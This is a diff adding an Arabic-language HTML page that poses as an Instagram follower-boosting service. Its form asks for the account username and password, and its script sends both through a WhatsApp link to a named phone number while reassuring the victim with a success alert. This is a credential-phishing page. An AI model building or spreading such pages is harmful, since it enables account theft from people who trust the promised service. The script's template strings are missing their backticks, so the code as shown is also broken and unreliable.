@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمة تطوير حسابات الإنستقرام</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-x: hidden;
+            perspective: 1000px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transform-style: preserve-3d;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotateX(0) rotateY(0); }
+            33% { transform: translateY(-10px) rotateX(2deg) rotateY(2deg); }
+            66% { transform: translateY(10px) rotateX(-2deg) rotateY(-2deg); }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+            transform: translateZ(20px);
+        }
+        
+        .logo i {
+            font-size: 50px;
+            color: #E1306C;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
+        }
+        
+        .logo h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.2);
+        }
+        
+        .logo p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+            transform-style: preserve-3d;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            transform: translateZ(10px);
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            font-size: 16px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            transform: translateZ(0);
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            transform: translateZ(5px);
+        }
+        
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(to right, #E1306C, #833AB4);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            transform: translateZ(10px);
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background: linear-gradient(to right, #833AB4, #E1306C);
+            transform: translateZ(15px) translateY(-3px);
+            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .whatsapp-contact {
+            text-align: center;
+            margin-top: 25px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            transform: translateZ(10px);
+        }
+        
+        .whatsapp-contact p {
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        
+        .whatsapp-contact a {
+            display: inline-block;
+            color: #25D366;
+            font-size: 18px;
+            font-weight: 700;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .whatsapp-contact a:hover {
+            transform: scale(1.05);
+            text-shadow: 0 0 10px rgba(37, 211, 102, 0.5);
+        }
+        
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin-top: 30px;
+            transform: translateZ(5px);
+        }
+        
+        .feature {
+            flex-basis: 48%;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 15px 10px;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px) translateZ(5px);
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .feature i {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #E1306C;
+        }
+        
+        .feature p {
+            font-size: 14px;
+        }
+        
+        .disclaimer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            opacity: 0.7;
+            transform: translateZ(5px);
+        }
+        
+        .cube {
+            position: absolute;
+            top: 20%;
+            left: 10%;
+            width: 50px;
+            height: 50px;
+            transform-style: preserve-3d;
+            animation: cube-rotate 15s infinite linear;
+            z-index: -1;
+        }
+        
+        .cube-face {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .cube-face:nth-child(1) { transform: translateZ(25px); }
+        .cube-face:nth-child(2) { transform: rotateY(180deg) translateZ(25px); }
+        .cube-face:nth-child(3) { transform: rotateY(90deg) translateZ(25px); }
+        .cube-face:nth-child(4) { transform: rotateY(-90deg) translateZ(25px); }
+        .cube-face:nth-child(5) { transform: rotateX(90deg) translateZ(25px); }
+        .cube-face:nth-child(6) { transform: rotateX(-90deg) translateZ(25px); }
+        
+        @keyframes cube-rotate {
+            0% { transform: rotateX(0) rotateY(0) rotateZ(0); }
+            100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .logo h1 {
+                font-size: 24px;
+            }
+            
+            .feature {
+                flex-basis: 100%;
+            }
+            
+            .cube {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="cube">
+        <div class="cube-face"></div>
+        <div class="cube-face"></div>
+        <div class="cube-face"></div>
+        <div class="cube-face"></div>
+        <div class="cube-face"></div>
+        <div class="cube-face"></div>
+    </div>
+    
+    <div class="container">
+        <div class="logo">
+            <i class="fab fa-instagram"></i>
+            <h1>تطوير حساب الإنستقرام</h1>
+            <p>احصل على الآلاف من المتابعين الحقيقين</p>
+        </div>
+        
+        <form id="instagramForm">
+            <div class="form-group">
+                <label for="username"><i class="fas fa-user"></i> اسم المستخدم أو البريد الإلكتروني</label>
+                <input type="text" id="username" name="username" required placeholder="ادخل اسم مستخدم الإنستقرام أو البريد الإلكتروني">
+            </div>
+            
+            <div class="form-group">
+                <label for="password"><i class="fas fa-lock"></i> كلمة المرور</label>
+                <input type="password" id="password" name="password" required placeholder="ادخل كلمة المرور">
+            </div>
+            
+            <button type="submit"><i class="fas fa-paper-plane"></i> إرسال</button>
+        </form>
+        
+        <div class="whatsapp-contact">
+            <p>للتواصل مباشرة عبر الواتساب:</p>
+            <a href="https://wa.me/213793837202" target="_blank">
+                <i class="fab fa-whatsapp"></i> +213 793 837 202
+            </a>
+        </div>
+        
+        <div class="features">
+            <div class="feature">
+                <i class="fas fa-users"></i>
+                <p>متابعين حقيقين</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-heart"></i>
+                <p>إعجابات نشطة</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-chart-line"></i>
+                <p>تحسين الأداء</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-shield-alt"></i>
+                <p>حماية وأمان</p>
+            </div>
+        </div>
+        
+        <div class="disclaimer">
+            <p>سيتم استخدام هذه المعلومات فقط لتطوير حسابك وزيادة متابعيك</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('instagramForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if(username && password) {
+                // إعداد رسالة الواتساب
+                const message = طلب جديد لتطوير الإنستقرام%0Aاسم المستخدم: ${username}%0Aكلمة المرور: ${password};
+                const whatsappURL = https://wa.me/213793837202?text=${message};
+                
+                // افتح رابط الواتساب
+                window.open(whatsappURL, '_blank');
+                
+                // إظهار رسالة نجاح
+                alert('تم إرسال المعلومات بنجاح! سنتواصل معك قريباً.');
+                
+                // مسح الحقول
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+            } else {
+                alert('يرجى ملء جميع الحقول');
+            }
+        });
+        
+        // إضافة تأثيرات ثلاثية الأبعاد عند تحريك الماوس
+        const container = document.querySelector('.container');
+        
+        document.addEventListener('mousemove', (e) => {
+            let x = (window.innerWidth / 2 - e.pageX) / 25;
+            let y = (window.innerHeight / 2 - e.pageY) / 25;
+            
+            container.style.transform = rotateY(${x}deg) rotateX(${-y}deg);
+        });
+    </script>
+</body>
+</html>
